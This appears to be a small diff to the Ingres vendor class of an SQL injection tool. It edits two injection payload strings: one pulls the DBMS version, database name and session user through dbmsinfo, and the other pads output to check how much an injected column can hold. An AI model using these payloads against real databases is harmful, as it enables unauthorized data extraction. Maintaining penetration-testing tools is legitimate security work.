@@ -13,7 +13,7 @@ public class IngresVendor extends AbstractVendor {
     @Override
     public String getSqlInfos() {
         return
-            "SELECT+dbmsinfo('_version')||'%04'||dbmsinfo('database')||'%04'||dbmsinfo('session_user')||'%04'||dbmsinfo('session_user')||0x01030307+r";
+            "SELECT+dbmsinfo('_version')||'%04'||dbmsinfo('database')||'%04'||dbmsinfo('session_user')||0x01030307+r";
     }
 
     @Override
@@ -66,7 +66,7 @@ public class IngresVendor extends AbstractVendor {
     @Override
     public String getSqlIndicesCapacityCheck(String[] indexes) {
         return
-            MediatorModel.model().indexesInUrl.replaceAll(
+            MediatorModel.model().getIndexesInUrl().replaceAll(
                 "1337(" + StringUtil.join(indexes, "|") + ")7331",
                 "'SQLi$1'||rpad('%23',1024,'%23')||'iLQS'"
             );
